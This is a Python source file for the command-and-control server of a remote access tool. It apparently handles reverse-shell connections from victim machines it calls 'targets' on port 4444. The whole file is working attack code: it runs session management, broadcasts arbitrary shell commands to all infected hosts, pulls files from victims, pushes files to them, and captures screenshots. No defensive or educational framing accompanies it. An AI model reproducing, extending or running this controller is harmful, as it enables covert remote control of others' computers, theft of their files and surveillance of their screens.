import socket
import json
import base64
import threading

count=0

def sendtoall(target, data):
    json_data = json.dumps(data)
    target.sendall(json_data.encode('utf-8'))


def shell(target,ip):
    def reliable_send(data):
        json_data = json.dumps(data)
        target.sendall(json_data.encode('utf-8'))

    def reliable_recv():
        data = ''
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    return None
                data += chunk.decode('utf-8')

                try:
                    return json.loads(data)
                except json.JSONDecodeError:
                    continue

            except:
                return None



    global count
    while True:
        command = input(f"shell#~%s{str(ip)}: ")
        reliable_send(command)
        if command == 'q':
            break

        # exit loop shell funcion comunication with target and ip sessions
        elif command == 'exit': 
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break

        elif command[:2] == 'cd' and len(command)>1:
            continue

        # download files
        elif command.startswith("dcp "):
            file_b64 = reliable_recv()
            if file_b64 is None:
                print("[!] Failed to download file")
                continue
            
            out_file = command[4:]

            try:
                with open(out_file, "wb") as f:
                    f.write(base64.b64decode(file_b64))
                print(f"[+] File saved as {out_file}")
            except:
                print("[!] Failed to write file")

        # uploading files
        elif command.startswith("ucp "):
            filename = command[4:]
            try:
                with open(filename, 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode()
                reliable_send(file_data)
            except:
                reliable_send(None)


        # screenshot painel
        elif command[:7] == 'scrshot':
            with open('monitor-%d.png'% count,'wb') as f:
                img = reliable_recv()
                if img is None:
                    print("[!] Failed to download file")
                    continue
                img_decoded = base64.b64decode(img)

                if img_decoded.startswith(b"[!!]"):
                    print(img_decoded.decode())
                else:
                    f.write(img_decoded)
                    count += 1
        
        else:
            res = reliable_recv()        
            if res is None:
                print("[!] Client disconnected!")
                return
            print(res)



def reliable_recv_target(target):
    data = ""
    while True:
        try:
            chunk = target.recv(1024)
            if not chunk:
                return None

            data += chunk.decode("utf-8")

            try:
                return json.loads(data)
            except json.JSONDecodeError:
                continue

        except:
            return None

def server():
    global clients
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target,ip=s.accept()
            targets.append(target)
            ips.append(ip)
            print(f"[+] {ip} has CONNECTED!")
            clients+=1
        except:
            pass

global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('192.168.1.8',4444))
s.listen(5)

clients=0
stop_threads = False

print('[+] Waiting for targets to connect...')

t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input('+ Center: ')
    if command == 'targets':
        count=0
        for ip in ips:
            print('Session '+str(count)+'. <--> '+str(ip))
            count+=1

    elif command[:7] == 'session':
        try:
            n = int(command[8:])
            target_n = targets[n]
            target_ip = ips[n]
            shell(target_n,target_ip)
        except:
            print("[!] No session under that number!")

    elif command == 'exit': # server exit
        for target in targets:
            target.close()
        s.close()
        stop_threads=True
        t1.join()
        break

    elif command.startswith("sendall "):
        real_cmd = command[8:]

        for i, target in enumerate(targets):
            try:
                sendtoall(target, real_cmd)
                response = reliable_recv_target(target)
                print(f"[{ips[i]}] → {response}")
            except Exception as e:
                print(f"[!] Failed on {ips[i]}: {e}")
    else:
        print("[!!!] Command doesnt exist!")

